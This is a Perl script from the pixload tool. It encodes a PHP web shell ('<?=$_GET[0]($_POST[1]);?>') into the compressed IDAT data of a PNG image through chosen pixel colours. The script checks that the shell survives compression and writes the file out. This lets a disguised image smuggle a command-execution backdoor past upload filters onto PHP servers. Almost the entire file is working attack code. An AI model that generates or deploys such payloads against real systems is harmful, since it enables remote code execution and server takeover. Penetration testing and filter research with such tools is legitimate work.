#!/usr/bin/perl
#
# PNG IDAT chunks ~ PHP payload
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# credits to @Adam_Logue && @fin1te && idontplaydarts && Kamil Vavra
#
# See LICENSE file for copyright and license details.
#

use strict;
use warnings;
use feature qw(say);

use Getopt::Long;
use GD;
use POSIX;

sub usage;
sub create_png;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'output=s'  =>  \my $outfile,
);
usage(0) if $help;
usage(1) unless $outfile;

my @payload = (
    0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
    0x66, 0x44, 0x50, 0x33
);

say <<EOF;
[>| PNG IDAT chunks  ~  PHP Payload Creator |<]

    https://github.com/chinarulezzz/pixload

EOF

create_png;

say `file $outfile`         if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   

sub usage {
    say "Usage: $0 -output payload.png";
    exit +shift;
}

sub create_png {
    say "[>] Generating output file";

    my $img = GD::Image->new(
        32,
        32,
         1, # Set 1 to TrueColor (24 bits of color data), default is 8-bit palette
    );

    for (my $i = 0; $i < @payload - 3; $i += 3) {
        my $r       = $payload[$i];
        my $g       = $payload[$i + 1];
        my $b       = $payload[$i + 2];
        my $color   = $img->colorAllocate($r, $g, $b);

        $img->setPixel(floor($i / 3), 0, $color);
    }

    if (index($img->png, '<?=$_GET[0]($_POST[1]);?>') == -1) {
        die "[✘] Bad png file, this might not work\n";
    }

    say "[✔] PNG with payload successfully generated";

    open my $fh, '>', $outfile or die;
    binmode $fh;
    print   $fh  $img->png;
    close   $fh;

    say "[✔] File saved to: $outfile\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
